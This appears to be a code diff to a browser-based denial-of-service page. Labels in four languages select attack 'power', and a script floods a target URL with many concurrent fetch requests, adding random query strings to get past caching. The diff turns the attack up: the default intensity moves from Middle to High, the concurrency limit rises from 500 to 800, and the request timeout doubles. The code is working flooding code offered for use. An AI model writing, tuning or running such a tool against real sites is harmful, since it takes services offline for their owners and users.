@@ -58,8 +58,8 @@ header("Pragma: no-cache")
     <tr>
         <td colspan="4">
             <input type="radio" name="power" id="low" /><label for="low">Slabý | Low | низкий | низький</label><br />
-            <input type="radio" name="power" id="middle" checked="checked" /><label for="middle">Střední | Middle | Середина | Середній</label><br />
-            <input type="radio" name="power" id="high" /><label for="high">Silný | High | Сильный | Сильний</label><br />
+            <input type="radio" name="power" id="middle"/><label for="middle">Střední | Middle | Середина | Середній</label><br />
+            <input type="radio" name="power" id="high" checked="checked" /><label for="high">Silný | High | Сильный | Сильний</label><br />
             <input type="radio" name="power" id="full" /><label for="full">Nejsilnější | Full | Полный | Повний</label><br />
             <input type="radio" name="power" id="extreme" /><label for="extreme">Extrémní | Extreme | Экстрим | Екстремальний</label><br />
         </td>
@@ -123,7 +123,7 @@ header("Pragma: no-cache")
 
     setInterval(printStats, 1000);
 
-    var CONCURRENCY_LIMIT = 500
+    var CONCURRENCY_LIMIT = 800
     var queue = []
 
     async function fetchWithTimeout(resource, options) {
@@ -149,7 +149,7 @@ header("Pragma: no-cache")
             }
             rand = i % 13 === 0 ? '' : ('?' + Math.floor(Math.random() * 1000))
             queue.push(
-                fetchWithTimeout(target + rand, {timeout: 500})
+                fetchWithTimeout(target + rand, {timeout: 1000})
                     .catch((error) => {
                         if (error.code === 20 /* ABORT */) {
                             return;
